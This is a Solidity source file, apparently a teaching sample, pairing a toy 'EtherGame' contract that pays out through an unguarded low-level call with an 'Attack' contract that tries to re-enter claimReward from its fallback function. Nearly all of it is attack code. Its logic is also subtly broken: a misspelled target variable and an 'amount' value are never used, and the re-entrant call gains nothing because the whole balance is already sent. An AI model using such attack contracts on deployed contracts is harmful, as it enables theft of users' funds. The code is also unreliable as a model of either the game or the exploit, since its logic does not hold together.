pragma solidity ^0.8.13;

contract EtherGame {
   uint public targerAmount = 1 ether;
   address payable public winner;

   function deposit() public payable {
      require(msg.value == 1 ether);

      uint amount = address(this).balance;
      require(winner == address(0));
      winner = payable(msg.sender);
   }

   function claimReward() public {
      require(msg.sender == winner);
      (bool success, ) = winner.call{value: address(this).balance}("");
      require(success);
   }
}

contract Attack {
   EtherGame public etherGame;

   constructor(address _etherGame) {
      etherGame = EtherGame(_etherGame);
   }

   fallback() external payable {
      if (address(etherGame).balance >= msg.value) {
         etherGame.claimReward();
      }
   }

   function attack() public payable {
      require(msg.value >= 1 ether);
      etherGame.deposit{value: msg.value}();
      etherGame.claimReward();
   }

}